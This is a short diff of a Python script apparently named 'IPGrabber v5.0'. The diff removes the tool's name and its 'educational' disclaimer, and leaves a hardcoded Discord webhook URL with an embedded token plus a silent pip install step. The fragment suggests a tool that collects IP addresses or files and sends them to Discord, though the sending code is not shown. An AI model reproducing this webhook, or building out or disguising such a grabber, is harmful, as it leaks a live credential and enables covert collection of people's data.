@@ -1,11 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
-Ω_BLACKSTAR – IPGrabber v5.0
-Educational & Authorized Testing Only.
-"""
-
 import os
 import sys
 import time
@@ -25,9 +17,7 @@ except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
     import requests
 
-# ------------------------------------------------------------
-# CONFIGURATION – REPLACE WITH YOUR WEBHOOK URL
-# ------------------------------------------------------------
+
 WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
 BLOCKLIST_FILE = os.path.expanduser("~/.ipgrabber_blocked.txt")
 MAX_FILE_SIZE = 8 * 1024 * 1024   # 8 MB
